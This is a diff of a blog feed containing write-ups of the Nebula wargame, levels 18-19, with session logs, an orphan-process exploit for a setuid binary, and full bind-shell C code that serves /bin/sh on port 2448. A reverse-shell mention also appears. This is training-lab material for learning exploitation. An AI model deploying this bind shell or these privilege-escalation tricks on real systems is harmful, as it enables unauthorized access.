+<p>We tried <code>--init-file</code> as it has the second argument some file:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ulimit -n 5&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ /home/flag18/flag18 &ndash;init-file -d /dev/tty -vvv
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;-&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;n&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &rsquo;t'
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;-&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;f&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;l&rsquo;
+</span><span class='line'>/home/flag18/flag18: invalid option &ndash; &lsquo;e&rsquo;
+</span><span class='line'>Starting up. Verbose level = 3
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>login
+</span><span class='line'>got [login] as input
+</span><span class='line'>attempting to login
+</span><span class='line'>logged in successfully (without password file)
+</span><span class='line'>closelog
+</span><span class='line'>got [closelog] as input
+</span><span class='line'>shell
+</span><span class='line'>id
+</span><span class='line'>uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18)
+</span><span class='line'>getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Second way is to use format string exploitation, line 48 is vulnerable at <code>notsupported()</code> function.</p>
+
+<p>For debugging, we downloaded <code>gdb-peda</code>:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>git clone &lt;a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git&lt;/a> ~/peda
+</span><span class='line'>echo &ldquo;source ~/peda/peda.py&rdquo; >> ~/.gdbinit</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/tmp$ gdb -q /home/flag18/flag18
+</span><span class='line'>Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>gdb-peda$ checksec
+</span><span class='line'>CANARY    : ENABLED
+</span><span class='line'>FORTIFY   : ENABLED
+</span><span class='line'>NX        : ENABLED
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : Partial</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Because the Fortify2, there was no easy way to solve it, technique from
+<a href="http://phrack.org/issues/67/9.html">phrack #67</a> could be very useful.</p>
+
+<p>There is also buffer overflow in <code>setuser()</code> function, that doesn&rsquo;t seem to be exploitable.</p>
+
+<h2>Level19</h2>
+
+<p><figure class='code'><figcaption><span>level19.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">stat</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">parent</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="o">/</span><span class="n">proc</span> <span class="n">entry</span><span class="p">,</span> <span class="n">so</span> <span class="n">we</span> <span class="n">can</span> <span class="n">verify</span> <span class="n">its</span> <span class="n">user</span> <span class="n">id</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">proc</span><span class="o">/%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">getppid</span><span class="p">());</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">stat</span><span class="p">()</span> <span class="n">it</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">check</span> <span class="n">parent</span> <span class="n">process</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">check</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">id</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">If</span> <span class="n">root</span> <span class="n">started</span> <span class="n">us</span><span class="p">,</span> <span class="n">it</span> <span class="n">is</span> <span class="n">ok</span> <span class="n">to</span> <span class="n">start</span> <span class="n">the</span> <span class="n">shell</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to execve&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">You</span> <span class="n">are</span> <span class="n">unauthorized</span> <span class="n">to</span> <span class="n">run</span> <span class="n">this</span> <span class="n">program</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>To pass the last challenge, our process parent id should match uid 0. This
+could be easily achieved when the parent dies and the process is adopted by
+init.</p>
+
+<p>Exploit:
+<figure class='code'><figcaption><span>exploit19.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">pid_t</span> <span class="n">childpid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">childpid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* child */</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;/home/flag19/flag19&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;/tmp/bindshell&quot;</span> <span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">execv</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Binding shell to port 2448, binary will be called from exploit.
+<figure class='code'><figcaption><span>bindshell.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">socklen_t</span> <span class="n">cli_len</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">srv_addr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">cli_addr</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">2448</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">srv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">srv_addr</span><span class="p">));</span>
+</span><span class='line'>    <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="cm">/* accept new connections */</span>
+</span><span class='line'>    <span class="n">cli_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cli_addr</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">cli_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">cli_len</span> <span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="cm">/* replace 0 with clientfd */</span>
+</span><span class='line'>    <span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>        <span class="cm">/* replace stdout &amp;amp; stderr */</span>
+</span><span class='line'>    <span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cd /tmp&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ gcc bindshell.c -o bindshell&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ gcc exploit19.c -o exploit19&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ ./exploit19&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ nc 0 2448
+</span><span class='line'>id
+</span><span class='line'>uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
+</span><span class='line'>getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Exploit-Exercises: Nebula (11-15)]]></title>
@@ -315,7 +1380,27 @@ to have more luck with terminating &lsquo;A&rsquo;.</p>
 </span><span class='line'>&lt;p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
 </span><span class='line'>getflag is executing on a non-flag account, this doesn&rsquo;t count</span></code></pre></td></tr></table></div></figure></p>
 
-<p>The getflag runs, albeit there is a bug in the binary (no seteuid calling), so it&rsquo;s not possible to get flag11 privileges.</p>
+<p>The getflag runs, albeit there is a bug in the binary, because the new process
+is created using <code>system()</code>, so it wasn&rsquo;t possible to get flag11 privileges.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>man 3 system&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>  Do not use system() from a program with set-user-ID or set-group-ID privileges,
+</span><span class='line'>  because strange values for some environment variables might be used to subvert
+</span><span class='line'>  system integrity. Use the exec(3) family of functions instead, but not
+</span><span class='line'>  execlp(3) or execvp(3). system() will not, in fact, work properly from
+</span><span class='line'>  programs with set-user-ID or set-group-ID privileges on systems on which
+</span><span class='line'>  /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian
+</span><span class='line'>  uses a modified bash which does not do this when invoked as sh.)</span></code></pre></td></tr></table></div></figure></p>
 
 <p>The second way is to use input with the length at least 1024. The decryption
 routine is almost symmetric. However, in this step <code>key -= buffer[i];</code> we need
@@ -1511,7 +2596,7 @@ we can create reverse shell on port 1337 via bash, using ruby to encode our payl
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 </pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
